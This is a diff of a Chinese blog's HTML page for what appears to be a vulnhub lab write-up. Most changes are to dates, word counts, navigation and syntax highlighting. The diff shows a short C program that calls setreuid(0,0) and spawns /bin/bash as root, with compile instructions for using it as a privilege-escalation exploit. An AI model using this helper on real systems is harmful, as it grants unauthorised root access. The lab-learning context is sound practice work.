@@ -515,14 +515,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-13
+                    2022-11-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    559
+                    556
                 </div>
                 
 
@@ -598,15 +598,15 @@
 <blockquote>
 <p>这里尽量使用低版本进行编译，kali 2022版本编译的文件会导致提权失败。。。</p>
 </blockquote>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 
-int main(int argc,char *argv[])
-{
-    setreuid(0,0);
-    execve("/bin/bash",NULL,NULL);
-}
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">setreuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>编译为可执行文件</p>
 <p><code>gcc test.c -o exp</code></p>
@@ -993,17 +993,16 @@ int main(int argc,char *argv[])
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/11/13/toc-heading-13/">
+                <a href="/2022/11/14/toc-heading-14/">
                     <div class="card-image">
                         
-                        <img src="https://cdnjson.com/images/2022/11/13/bg.jpg" class="responsive-img" alt="vulnhub靶场Os-hackNos-3">
+                        <img src="https://cdnjson.com/images/2022/11/14/bg.jpg" class="responsive-img" alt="vulnhub靶场OS-BYTESEC">
                         
-                        <span class="card-title">vulnhub靶场Os-hackNos-3</span>
+                        <span class="card-title">vulnhub靶场OS-BYTESEC</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1013,9 +1012,9 @@ int main(int argc,char *argv[])
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-13
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-14
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1028,7 +1027,6 @@ int main(int argc,char *argv[])
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1370,7 +1368,7 @@ int main(int argc,char *argv[])
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38.9k</span>&nbsp;字
+                class="white-color">39.4k</span>&nbsp;字
             
             
             
